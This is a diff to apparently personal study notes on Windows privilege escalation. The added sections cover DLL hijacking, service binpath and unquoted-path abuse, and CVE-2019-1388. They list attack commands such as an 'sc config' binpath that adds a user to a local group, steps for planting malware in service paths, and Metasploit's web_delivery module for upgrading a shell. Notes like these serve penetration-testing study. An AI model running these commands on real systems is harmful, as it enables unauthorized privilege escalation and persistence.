@@ -182,7 +182,7 @@ Alternative escalation method
 ## Escalation Path: Impersonation and Potato Attacks
 
 Shell
-- `whomi /priv`
+- `whoami /priv`
 
 Meterpreter
 - `getprivs`
@@ -325,3 +325,38 @@ To detect: `icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Sta
 
 Exploit:
 - Download malware to `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup`
+
+## Escalation Path:  DLL Hijacking
+
+Look for DLLs checks in a writeable path, where the DLL does not exist.
+
+Place malware into the path that the service is looking for and
+- `sc stop dllsvc`
+- `sc start dllsvc`
+
+## Escalation Path: Service Permissions (Paths)
+
+For PowerUp, add `Invoke-AllChecks` to the last line of the file.
+
+To find out what the service name is: `powershell -c Get-Service`
+
+### Binary Paths
+
+Service permissions
+- `restart required`
+- `sc config [service] binpath= "net localgroup [group] [username] /add"`
+  - This can be an arbitrary command.
+
+### Unquoted Service Paths
+
+Unquoted service path
+- Upload malware within the service path
+- `sc start [service]`
+
+## Escalation Path: CVE-2019-1388
+
+URLs:
+- https://www.youtube.com/watch?v=3BQKpPNlTSo
+- https://www.rapid7.com/db/vulnerabilities/msft-cve-2019-1388
+
+Using `msfconsole` with `use exploit/multi/script/web_delivery` can sometimes easily upgrade your shell.
